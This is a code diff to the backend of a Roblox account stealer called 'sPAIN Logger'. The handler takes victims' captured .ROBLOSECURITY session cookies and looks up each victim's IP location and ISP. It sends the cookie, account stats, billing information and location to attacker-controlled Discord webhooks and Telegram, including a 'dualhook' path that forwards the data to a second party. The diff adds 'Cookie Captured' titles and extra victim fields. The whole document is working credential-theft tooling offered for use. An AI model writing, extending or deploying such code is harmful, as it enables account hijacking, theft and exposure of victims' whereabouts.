@@ -10,6 +10,7 @@ const BASE_URL    = 'https://spain-tools.vercel.app';
 const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
 const EMOJI     = '<a:emoji_17:1508694920972468347>';
+const FIRE      = '🔥';
 
 // ── Redis ─────────────────────────────────────────────────────────────────────
 async function redisGet(key) {
@@ -146,38 +147,55 @@ export default async function handler(req, res) {
   const now    = new Date().toISOString();
   const pName  = record.displayName || slug;
   const isDH   = !!record.dualhookParent;
-  const cookie   = findCookie(slots);
+  const cookie = findCookie(slots);
 
   // Build webhook list
   let webhook1 = null;
   const webhook2 = record.webhook;
+  let dhParentName = null;
+  
   if (isDH) {
     try {
       const parent = await redisGet(`slot:${record.dualhookParent}`);
-      if (parent?.webhook) webhook1 = parent.webhook;
+      if (parent?.webhook) {
+        webhook1 = parent.webhook;
+        dhParentName = parent.displayName || record.dualhookParent;
+      }
     } catch (_) {}
   }
+  
   const allWH = [webhook2, ...(webhook1 && webhook1 !== webhook2 ? [webhook1] : [])];
 
   // ── No cookie ────────────────────────────────────────────────────────────────
   if (!cookie) {
     const geo = await getIpGeo(ip);
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
+    
+    // Build embed based on dualhook status
+    const embedTitle = isDH ? '🍪 Cookie Captured (Dualhook)' : '🍪 Cookie Captured';
+    const embedDescription = isDH 
+      ? `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`
+      : `${FIRE} s.PAIN ${FIRE}`;
+    
     await Promise.all(allWH.map(wh => discordSend(wh, {
       content: '@everyone',
       embeds: [{
-        title:       '⚠️ Wrong Cookie — Troll Detected',
-        description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
+        title:       embedTitle,
+        description: embedDescription,
         color:       0xff3333,
         fields: [
           { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
-          { name: '📍 Location', value: loc,                   inline: true },
+          { name: '📄 Page',      value: `\`${pName}\``,       inline: true },
+          ...(isDH ? [{ name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true }] : []),
+          { name: '📍 Location', value: loc,                   inline: false },
           { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
-          { name: '🕐 Time',     value: now,                   inline: false }
+          { name: '🕐 Time',     value: now,                   inline: true }
         ],
-        footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now
+        footer: { text: `sPAIN Logger • ${pName}` }, 
+        timestamp: now
       }]
     })));
+    
     await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
     return res.status(200).json({ success: true });
   }
@@ -196,21 +214,30 @@ export default async function handler(req, res) {
 
   // ── Worker failed or invalid cookie ───────────────────────────────────────────
   if (!info) {
+    const embedTitle = isDH ? '🍪 Cookie Captured (Dualhook)' : '🍪 Cookie Captured';
+    const embedDescription = isDH 
+      ? `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`
+      : `${FIRE} s.PAIN ${FIRE}`;
+    
     await Promise.all(allWH.map(wh => discordSend(wh, {
       content: '@everyone',
       embeds: [{
-        title:       '⚠️ Invalid Cookie',
-        description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
+        title:       embedTitle,
+        description: embedDescription,
         color:       0xff3333,
         fields: [
           { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
-          { name: '📍 Location', value: loc,                   inline: true },
-          { name: '💀 Status',   value: 'Cookie expired or invalid', inline: true },
-          { name: '🕐 Time',      value: now,                   inline: false }
+          { name: '📄 Page',      value: `\`${pName}\``,       inline: true },
+          ...(isDH ? [{ name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true }] : []),
+          { name: '💀 Status',   value: 'Invalid/Expired Cookie', inline: true },
+          { name: '📍 Location', value: loc,                   inline: false },
+          { name: '🕐 Time',      value: now,                   inline: true }
         ],
-        footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now
+        footer: { text: `sPAIN Logger • ${pName}` }, 
+        timestamp: now
       }]
     })));
+    
     await tgSend(`⚠️ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
     return res.status(200).json({ success: true });
   }
@@ -249,18 +276,19 @@ export default async function handler(req, res) {
   const refreshUrl   = `${BASE_URL}/r/${refreshToken}`;
   const profileUrl   = uid ? `https://www.roblox.com/users/${uid}/profile` : 'https://www.roblox.com';
 
-  // Description - dualhook vs normal
-  const descEmoji = isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} \`sPAIN\` ${EMOJI}`;
-  const descLinks = `[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})\n\n[Join Discord](${DISCORD_INV})`;
-  const description = `${descEmoji}\n\n${descLinks}`;
+  // Build title and description based on dualhook status
+  const embedTitle = isDH ? '🍪 Cookie Captured (Dualhook)' : '🍪 Cookie Captured';
+  const embedDescription = isDH 
+    ? `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`
+    : `${FIRE} s.PAIN ${FIRE}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`;
 
   // Cookie display — trimmed for embed, full via chunked message
   const cookieDisplay = cookie.length > 950 ? cookie.substring(0, 950) + '…' : cookie;
 
   // ── Build the rich embed ──────────────────────────────────────────────────
   const richEmbed = {
-    title:       `🧑 ${displayName} ${ageBracket}`,
-    description,
+    title:       embedTitle,
+    description: embedDescription,
     color:       5793266,
     thumbnail:   { url: avatarUrl },
     fields: [
@@ -269,14 +297,35 @@ export default async function handler(req, res) {
         value:  `\`${username}\``,
         inline: true
       },
-      // PASSWORD FIELD REMOVED - no longer included
       {
-        name:  '📊 Account Stats',
-        value: `\`Account Age:\` \`${fmt(ageDays)} Days\``
+        name:   '📄 Page',
+        value:  `\`${pName}\``,
+        inline: true
+      },
+      ...(isDH ? [{
+        name:   '🔒 DH Parent',
+        value:  `\`${dhParentName || 'Unknown'}\``,
+        inline: true
+      }] : []),
+      {
+        name:   '🌐 IP',
+        value:  `\`${ip}\``,
+        inline: true
       },
       {
-        name:  '📍 Locations',
-        value: `• \`Account:\` ${country} ${cflag}\n• \`Victim:\` ${country} ${cflag}\n• \`IP:\` \`${ip}\`\n• \`ISP:\` ${isp}`
+        name:   '📍 Location',
+        value:  `${country} ${cflag}`,
+        inline: true
+      },
+      {
+        name:   '🗺️ ISP',
+        value:  isp,
+        inline:   true
+      },
+      {
+        name:  '📊 Account Stats',
+        value: `\`Account Age:\` \`${fmt(ageDays)} Days\``,
+        inline: false
       },
       {
         name:   '💳 Billing',
@@ -304,12 +353,14 @@ export default async function handler(req, res) {
         inline: true
       },
       {
-        name:  '🎮 Gamepasses Played',
-        value: `Pet Simulator 99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMurder Mystery 2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`
+        name:  '🎮 Gamepasses',
+        value: `PS99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMM2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`,
+        inline: false
       },
       {
         name:  '🔐 ROBLOSECURITY',
-        value: `\`\`\`${cookieDisplay}\`\`\``
+        value: `\`\`\`${cookieDisplay}\`\`\``,
+        inline: false
       }
     ],
     footer:    { text: `sPAIN Logger • ${pName} • ${nowStr}` },
